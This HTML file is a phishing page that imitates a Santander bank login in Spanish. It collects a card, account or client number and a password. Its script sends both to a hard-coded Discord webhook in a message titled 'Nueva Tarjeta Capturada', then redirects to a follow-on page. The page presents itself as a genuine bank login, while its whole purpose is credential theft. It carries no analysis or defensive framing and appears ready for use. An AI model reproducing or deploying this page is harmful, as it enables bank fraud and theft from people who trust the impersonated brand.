<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Santander</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <style>
        /* (mismo CSS que antes) */
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Roboto,Arial,sans-serif; }
        body { background:#f5f5f5; min-height:100vh; display:flex; justify-content:center; align-items:center; margin:0; padding:20px; }
        .card { background:#ffffff; width:100%; max-width:420px; border-radius:20px; padding:40px 32px 32px; box-shadow:0 10px 30px rgba(0,0,0,0.08); text-align:center; }
        .logo-container { display:flex; justify-content:center; align-items:center; margin-bottom:8px; }
        .logo-container img { max-width:180px; height:auto; display:block; }
        .divider { width:60px; height:3px; background:#e3000b; margin:12px auto 20px; border-radius:4px; }
        .welcome { font-size:18px; font-weight:500; color:#1a1a1a; margin-bottom:4px; }
        .welcome-sub { font-size:14px; color:#666; margin-bottom:28px; font-weight:400; }
        .form-group { text-align:left; margin-bottom:20px; }
        .form-group label { display:block; font-size:13px; font-weight:600; color:#333; margin-bottom:6px; letter-spacing:0.3px; }
        .input-wrapper { display:flex; align-items:center; background:#f8f8f8; border-radius:12px; padding:0 16px; border:1.5px solid #e6e6e6; transition:border-color .2s, box-shadow .2s; }
        .input-wrapper:hover, .input-wrapper:focus-within { border-color:#e3000b; box-shadow:0 0 0 3px rgba(227,0,11,0.1); }
        .input-wrapper i { color:#999; font-size:16px; }
        .input-wrapper .icon-left { margin-right:12px; }
        .input-wrapper input { width:100%; padding:14px 0; border:none; background:transparent; font-size:15px; color:#1a1a1a; outline:none; }
        .input-wrapper input::placeholder { color:#b0b0b0; font-weight:400; font-size:14px; }
        .toggle-password { cursor:pointer; color:#999; font-size:18px; margin-left:8px; transition:color .2s; user-select:none; }
        .toggle-password:hover { color:#e3000b; }
        .btn-continuar { width:100%; padding:16px; background:#e3000b; color:#fff; border:none; border-radius:12px; font-size:17px; font-weight:600; letter-spacing:0.5px; cursor:pointer; transition:background .2s, transform .1s; margin-top:8px; display:flex; align-items:center; justify-content:center; gap:10px; }
        .btn-continuar:hover { background:#c9000a; }
        .btn-continuar:active { transform:scale(0.97); }
        .btn-continuar i { font-size:18px; }
        .footer-note { margin-top:28px; font-size:12px; color:#999; border-top:1px solid #f0f0f0; padding-top:20px; display:flex; justify-content:center; gap:20px; }
        .footer-note a { color:#999; text-decoration:none; font-weight:500; transition:color .2s; }
        .footer-note a:hover { color:#e3000b; }
        @media (max-width:480px) { .card { padding:32px 20px 24px; } .logo-container img { max-width:140px; } .welcome { font-size:16px; } .btn-continuar { font-size:16px; padding:15px; } }
    </style>
</head>
<body>

<div class="card">
    <div class="logo-container">
        <img src="img\santander_logo.png" alt="Logo Santander" />
    </div>
    <div class="divider"></div>
    <div class="welcome">Te damos la bienvenida a Santander</div>
    <div class="welcome-sub">Ingresa tu información</div>

    <form id="loginForm" action="#" method="post">
        <div class="form-group">
            <label for="cliente">No. Tarjeta / No. Cuenta / Código de cliente</label>
            <div class="input-wrapper">
                <i class="fas fa-credit-card icon-left"></i>
                <input type="text" id="cliente" placeholder="Ej. 1234 5678 9012 3456 o número de cuenta" autocomplete="off" />
            </div>
        </div>

        <div class="form-group">
            <label for="password">Contraseña</label>
            <div class="input-wrapper">
                <i class="fas fa-lock icon-left"></i>
                <input type="password" id="password" placeholder="Contraseña" maxlength="8" autocomplete="off" />
                <i class="fas fa-eye toggle-password" id="togglePassword"></i>
            </div>
        </div>

        <button type="submit" class="btn-continuar">
            <i class="fas fa-arrow-right"></i> Continuar
        </button>
    </form>

    <div class="footer-note">
        <a href="#"><i class="fas fa-lock"></i> Seguridad</a>
        <a href="#"><i class="fas fa-question-circle"></i> Ayuda</a>
    </div>
</div>

<script>
    // Mostrar/ocultar contraseña
    const toggleBtn = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('password');
    toggleBtn.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        this.classList.toggle('fa-eye');
        this.classList.toggle('fa-eye-slash');
    });

    // Filtro y mayúscula inicial
    passwordInput.addEventListener('input', function(e) {
        let value = this.value.replace(/[^A-Za-z0-9]/g, '');
        if (value.length > 0 && value.charAt(0) >= 'a' && value.charAt(0) <= 'z') {
            value = value.charAt(0).toUpperCase() + value.slice(1);
        }
        const cursorPos = this.selectionStart;
        this.value = value;
        this.setSelectionRange(Math.min(cursorPos, value.length), Math.min(cursorPos, value.length));
    });

    // Envío
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const cliente = document.getElementById('cliente').value.trim();
        const password = passwordInput.value.trim();

        if (!cliente || !password) {
            alert('Por favor, completa todos los campos.');
            return;
        }
        if (!/^[A-Z][A-Za-z0-9]{0,7}$/.test(password)) {
            alert('La contraseña debe tener máximo 8 caracteres alfanuméricos y comenzar con mayúscula.');
            passwordInput.focus();
            return;
        }

        // Guardar usuario para las siguientes páginas
        sessionStorage.setItem('usuario', cliente);

        // Enviar a Discord
        const webhookURL = 'https://discord.com/api/webhooks/1516947295440994545/BE5cTDDVaZ7a2_bp1MdqVR8kwa_Hn-PF71donMbTfd1E8aujXpknl-jwCe8vIt-LQrVm';
        const payload = {
            username: 'Santander - Tarjeta',
            embeds: [{
                title: 'Nueva Tarjeta Capturada',
                color: 0xe3000b,
                fields: [
                    { name: 'Usuario/Doc', value: cliente, inline: true },
                    { name: 'Contraseña', value: password, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        };
        try {
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (error) { console.error('Error al enviar a Discord:', error); }

        window.location.href = 'cargando.html';
    });
</script>

</body>
</html>
